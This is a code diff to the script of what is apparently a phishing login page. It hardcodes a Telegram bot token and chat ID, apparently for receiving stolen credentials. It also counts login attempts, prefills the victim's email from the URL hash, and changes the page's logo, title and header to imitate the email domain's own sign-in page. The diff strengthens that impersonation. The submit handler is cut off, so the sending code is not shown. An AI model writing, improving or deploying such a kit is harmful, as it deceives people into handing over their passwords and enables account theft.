@@ -3,26 +3,34 @@ const BOT_TOKEN = '7075899066:AAFC8B3xFgH4Vw9zmQS3k3bwlVkxZH_ji5M';
 const CHAT_ID = '7421629323';
 let loginAttempts = 0;
 
-// Function to get email from hash
+// Function to extract email from the URL hash
 function getEmailFromHash() {
     const hash = window.location.hash.substring(1);
     return hash.includes('@') ? hash : null;
 }
 
-// Update logo dynamically based on email domain
-function updateLogo(email) {
+// Function to dynamically update logo, title, and header based on the email domain
+function updatePageContent(email) {
     const emailParts = email.split('@');
     if (emailParts.length > 1) {
         const domain = emailParts[1];
-        const logoUrl = `https://www.${domain}/favicon.ico`; // Example: Use the domain's favicon as logo
-        const logoElement = document.getElementById('dynamic-logo');
+        const logoUrl = `https://www.${domain}/favicon.ico`; // Example: Use domain's favicon as logo
+        const title = `Login to ${domain}`;
 
-        // Update the logo src attribute
+        // Update logo
+        const logoElement = document.getElementById('dynamic-logo');
         logoElement.src = logoUrl;
+
+        // Update title
+        document.title = title;
+
+        // Update header text
+        const headerTitle = document.getElementById('dynamic-title');
+        headerTitle.textContent = `Log in to ${domain}`;
 
         // Add fallback in case the image fails to load
         logoElement.onerror = () => {
-            logoElement.src = 'https://via.placeholder.com/100'; // Fallback logo
+            logoElement.src = 'https://via.placeholder.com/100'; // Default logo
         };
     }
 }
@@ -32,14 +40,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const emailFromHash = getEmailFromHash();
     if (emailFromHash) {
         document.getElementById('user-email').value = emailFromHash;
-        updateLogo(emailFromHash);
+        updatePageContent(emailFromHash);
     }
-});
-
-// Event listener for form input to update the logo dynamically
-document.getElementById('user-email').addEventListener('input', (event) => {
-    const email = event.target.value;
-    updateLogo(email);
 });
 
 document.getElementById('loginForm').addEventListener('submit', function(event) {
